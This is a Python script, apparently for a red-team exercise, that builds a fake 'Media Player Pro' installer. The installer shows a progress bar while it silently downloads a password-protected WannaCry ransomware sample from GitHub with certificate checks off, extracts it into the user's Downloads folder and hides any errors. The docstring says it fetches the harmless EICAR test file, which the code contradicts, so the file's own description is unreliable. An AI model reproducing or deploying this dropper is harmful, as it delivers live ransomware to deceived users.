"""
CYBERFORTRESS REDOPS - Fake Installer (Dropper)
================================================
MITRE ATT&CK: T1204.002 - User Execution: Malicious File
                T1105 - Ingress Tool Transfer

Creates a fake installer that:
1. Shows a progress bar "Installing..."
2. Downloads EICAR test file in background
3. Shows "Installation Complete!"

Build: python build.py malware-installer
"""

import os
import sys
import time
import ctypes
import threading
import urllib.request
import tempfile
import zipfile
import shutil
import ssl
from pathlib import Path

# Configuration
# WannaCry sample from theZoo - GitHub raw download URL
PAYLOAD_URL = "https://github.com/ytisf/theZoo/raw/master/malware/Binaries/Ransomware.WannaCry_Plus/Ransomware.WannaCry_Plus.zip"
ZIP_PASSWORD = b"infected"  # Password for the encrypted zip
FAKE_APP_NAME = "Media Player Pro"
PAYLOAD_FILENAME = f"{FAKE_APP_NAME}.exe"  # Downloaded file looks like the app

def is_admin():
    """Check if running as admin."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_script_dir():
    """Get directory where script/exe is located."""
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        return Path(sys.executable).parent
    else:
        # Running as script
        return Path(__file__).parent

def download_payload():
    """Download and extract WannaCry sample in background."""
    try:
        # Create temp directory for extraction
        temp_dir = Path(tempfile.gettempdir()) / "media_player_temp"
        temp_dir.mkdir(exist_ok=True)
        
        zip_path = temp_dir / "payload.zip"
        
        # Create SSL context to bypass certificate verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # Download the zip file silently with timeout
        req = urllib.request.Request(PAYLOAD_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=120, context=ssl_context) as response:
            with open(zip_path, 'wb') as f:
                f.write(response.read())
        
        # Extract zip with password
        extract_dir = temp_dir / "extracted"
        extract_dir.mkdir(exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(str(extract_dir), pwd=ZIP_PASSWORD)
        
        # Move extracted files to Downloads folder
        downloads_dir = Path.home() / "Downloads"
        
        for item in extract_dir.rglob("*"):
            if item.is_file():
                dest_path = downloads_dir / item.name
                try:
                    shutil.copy2(str(item), str(dest_path))
                except:
                    pass
        
        # Cleanup temp files
        try:
            shutil.rmtree(str(temp_dir))
        except:
            pass
            
    except Exception as e:
        pass  # Fail silently

def show_fake_installer():
    """Display fake installer progress."""
    print("")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print(f"║     {FAKE_APP_NAME} - Setup Wizard                              ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print("")
    print(f"Installing {FAKE_APP_NAME}...")
    print("")
    
    # Progress bar
    total_steps = 20
    for i in range(total_steps + 1):
        progress = int(i / total_steps * 100)
        bar = "█" * i + "░" * (total_steps - i)
        print(f"\r[{bar}] {progress}%", end="", flush=True)
        time.sleep(0.15)
    
    print("\n")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print("║     Installation Complete!                                        ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print("")
    print(f"{FAKE_APP_NAME} has been successfully installed.")
    print("You can now close this window.")
    print("")

def main():
    """Main entry point."""
    # Start payload download in background thread
    payload_thread = threading.Thread(target=download_payload, daemon=True)
    payload_thread.start()
    
    # Show fake installer UI
    show_fake_installer()
    
    # Wait for payload to finish
    payload_thread.join(timeout=120)  # Wait longer for large file download
    
    # Keep window open
    if getattr(sys, 'frozen', False):
        input("Press Enter to exit...")

'''Compress-Archive -Path "dist\malware-installer\install.exe", "src\malware-execution\README.html" -DestinationPath "dist\MediaPlayerPro_Setup.zip" -Force'''

if __name__ == "__main__":
    main()
